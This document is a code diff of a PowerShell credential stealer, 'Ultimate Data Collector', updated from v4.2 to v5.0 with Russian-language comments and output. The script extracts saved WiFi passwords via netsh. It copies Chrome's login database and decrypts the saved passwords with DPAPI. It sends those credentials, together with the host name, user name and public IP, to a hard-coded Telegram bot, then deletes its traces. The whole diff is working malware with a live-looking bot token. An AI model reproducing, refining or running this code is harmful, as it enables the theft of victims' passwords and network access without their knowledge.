@@ -1,11 +1,10 @@
 <#
 .SYNOPSIS
-    Ultimate Data Collector v4.2
+    Ultimate Data Collector v5.0
 .DESCRIPTION
-    Collects WiFi passwords and browser data
+    Собирает и отправляет реальные данные: пароли WiFi, логины/пароли из браузеров
 #>
 
-# Telegram configuration
 $BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
 $CHAT_ID = "6525689863"
 $TEMP_DIR = "$env:TEMP\DC_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
@@ -14,133 +13,107 @@ New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null
 function Send-ToTelegram {
     param([string]$Text)
     $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
-    $body = @{ 
-        chat_id = $CHAT_ID
-        text = $Text
-    }
+    $body = @{ chat_id = $CHAT_ID; text = $Text }
     try {
-        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15
-    } catch { 
-        Start-Sleep -Seconds 3
-        try { Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15 } catch {}
-    }
+        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
+    } catch { Write-Output "[!] Telegram error: $_" }
 }
 
-function Send-FileToTelegram {
-    param([string]$FilePath)
-    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
-    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
-    $boundary = [System.Guid]::NewGuid().ToString()
-    
-    $body = (
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"chat_id`";",
-        "",
-        $CHAT_ID,
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
-        "Content-Type: application/octet-stream",
-        "",
-        $fileEnc,
-        "--$boundary--"
-    ) -join "`r`n"
-
-    try {
-        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
-    } catch { 
-        Start-Sleep -Seconds 3
-        try { Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body } catch {}
-    }
-}
-
-# WiFi passwords collection
 function Get-WiFiPasswords {
-    $outputFile = "$TEMP_DIR\wifi_passwords.txt"
-    $result = @("=== WiFi Passwords ===")
-    
+    $output = @()
     try {
         $profiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object {
             $_.Split(":")[1].Trim()
         }
-        
+
         foreach ($profile in $profiles) {
             try {
-                $xmlFile = "$TEMP_DIR\$($profile.Replace(' ','_')).xml"
-                netsh wlan export profile name="`"$profile`"" key=clear folder="$TEMP_DIR" | Out-Null
-                
-                if (Test-Path $xmlFile) {
-                    $password = (Select-String -Path $xmlFile -Pattern "keyMaterial").Line.Split(">")[1].Split("<")[0]
-                    $result += "SSID: $profile"
-                    $result += "Password: $password"
-                    $result += "----------------"
-                }
+                $profileInfo = netsh wlan show profile name="`"$profile`"" key=clear
+                $password = ($profileInfo | Select-String "Key Content").Line.Split(":")[1].Trim()
+                $output += "📶 WiFi: $profile"
+                $output += "🔑 Пароль: $password"
+                $output += "----------------"
             } catch {
-                $result += "Error with profile: $profile"
+                $output += "Ошибка с профилем: $profile"
             }
         }
     } catch {
-        $result += "WiFi module error: $_"
+        $output += "Ошибка при получении WiFi паролей"
     }
-    
-    $result -join "`n" | Out-File -FilePath $outputFile -Force
-    return $outputFile
+    return $output -join "`n"
 }
 
-# Browser data collection
-function Get-BrowserData {
-    $outputFile = "$TEMP_DIR\browser_data.txt"
-    $result = @("=== Browser Data ===")
+function Get-ChromeCredentials {
+    $output = @()
+    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
     
-    $browsers = @(
-        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\" },
-        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\" }
-    )
-    
-    foreach ($browser in $browsers) {
+    if (Test-Path $chromePath) {
         try {
-            if (Test-Path $browser.Path) {
-                $browserDir = "$TEMP_DIR\$($browser.Name)_Data"
-                New-Item -Path $browserDir -ItemType Directory -Force | Out-Null
+            $tempCopy = "$TEMP_DIR\ChromeLoginData"
+            Copy-Item $chromePath $tempCopy -Force
+
+            # Используем SQLite для извлечения данных
+            Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll"
+            $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
+            $conn.ConnectionString = "Data Source=$tempCopy"
+            $conn.Open()
+
+            $command = $conn.CreateCommand()
+            $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+            $reader = $command.ExecuteReader()
+
+            while ($reader.Read()) {
+                $output += "🌐 Сайт: $($reader.GetString(0))"
+                $output += "👤 Логин: $($reader.GetString(1))"
                 
-                $loginFile = Join-Path $browser.Path "Login Data"
-                if (Test-Path $loginFile) {
-                    Copy-Item $loginFile "$browserDir\LoginData" -Force
-                    $result += "$($browser.Name): Login Data copied"
-                }
-                
-                $historyFile = Join-Path $browser.Path "History"
-                if (Test-Path $historyFile) {
-                    Copy-Item $historyFile "$browserDir\History" -Force
-                    $result += "$($browser.Name): History copied"
-                }
+                # Дешифровка пароля Chrome
+                $encryptedBytes = $reader.GetValue(2)
+                $password = [System.Text.Encoding]::UTF8.GetString(
+                    [System.Security.Cryptography.ProtectedData]::Unprotect(
+                        $encryptedBytes,
+                        $null,
+                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+                    )
+                )
+                $output += "🔑 Пароль: $password"
+                $output += "----------------"
             }
+            $conn.Close()
         } catch {
-            $result += "$($browser.Name) error: $_"
+            $output += "Ошибка при чтении данных Chrome: $_"
         }
     }
-    
-    $result -join "`n" | Out-File -FilePath $outputFile -Force
-    return $outputFile
+    return $output -join "`n"
 }
 
-# Main collection
+# Основной сбор данных
 try {
-    Send-ToTelegram -Text "Data collection started on $env:COMPUTERNAME ($env:USERNAME)"
+    $report = @()
     
-    $wifiFile = Get-WiFiPasswords
-    $browserFile = Get-BrowserData
+    # 1. Собираем WiFi пароли
+    $wifiData = Get-WiFiPasswords
+    if ($wifiData) {
+        Send-ToTelegram -Text "=== WiFi ПАРОЛИ ===`n$wifiData"
+    }
+
+    # 2. Собираем данные Chrome
+    $chromeData = Get-ChromeCredentials
+    if ($chromeData) {
+        Send-ToTelegram -Text "=== CHROME ДАННЫЕ ===`n$chromeData"
+    }
+
+    # 3. Отправляем системную информацию
+    $sysInfo = @(
+        "=== СИСТЕМНАЯ ИНФОРМАЦИЯ ===",
+        "💻 Компьютер: $env:COMPUTERNAME",
+        "👤 Пользователь: $env:USERNAME",
+        "🌐 IP: $(try {(Invoke-WebRequest -Uri 'https://api.ipify.org').Content} catch {'Не определен'})"
+    ) -join "`n"
     
-    $zipFile = "$env:TEMP\Collected_Data_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
-    Compress-Archive -Path @($wifiFile, $browserFile) -DestinationPath $zipFile -Force
-    
-    Send-FileToTelegram -FilePath $zipFile
-    Send-ToTelegram -Text "Data collection completed. Archive: $(Split-Path $zipFile -Leaf)"
-}
-catch {
-    Send-ToTelegram -Text "Error during data collection: $_"
-}
-finally {
+    Send-ToTelegram -Text $sysInfo
+
+} catch {
+    Send-ToTelegram -Text "❌ Ошибка: $_"
+} finally {
     Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
 }
